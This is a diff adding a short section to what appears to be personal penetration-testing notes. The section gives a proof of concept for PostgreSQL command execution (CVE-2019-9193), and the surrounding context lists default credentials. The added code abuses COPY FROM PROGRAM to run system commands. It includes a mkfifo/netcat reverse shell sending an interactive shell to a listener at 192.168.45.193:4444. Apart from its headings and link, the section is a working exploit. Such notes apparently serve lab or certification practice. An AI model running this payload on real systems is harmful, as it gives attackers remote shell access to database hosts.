@@ -80,6 +80,22 @@ admin lab # user # pass
 guest guest  # user # pass
 ```
 
+#### PostgreSQL Command Execution
+##### CVE-2019-9193
+[PayloadAllTheThings_PostgreSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
+
+```
+#PoC
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+
+COPY cmd_exec FROM PROGRAM 'id';
+
+COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.193 4444 >/tmp/f';
+
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec;
+```
 
 #### Extra Notes I had
 
